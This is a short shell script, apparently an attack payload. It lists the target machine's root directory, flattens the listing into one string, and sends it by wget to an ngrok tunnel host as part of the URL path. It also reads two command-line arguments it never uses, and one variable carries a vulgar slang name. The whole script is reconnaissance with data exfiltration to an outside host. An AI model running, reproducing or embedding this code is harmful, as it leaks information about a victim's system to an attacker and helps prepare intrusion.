#!/bin/sh

pidor=$(ls / | tr '\n' '_') 
elaman=$1
is=$2

wget http://fb4ac0e04f9a.ngrok.io/$pidor
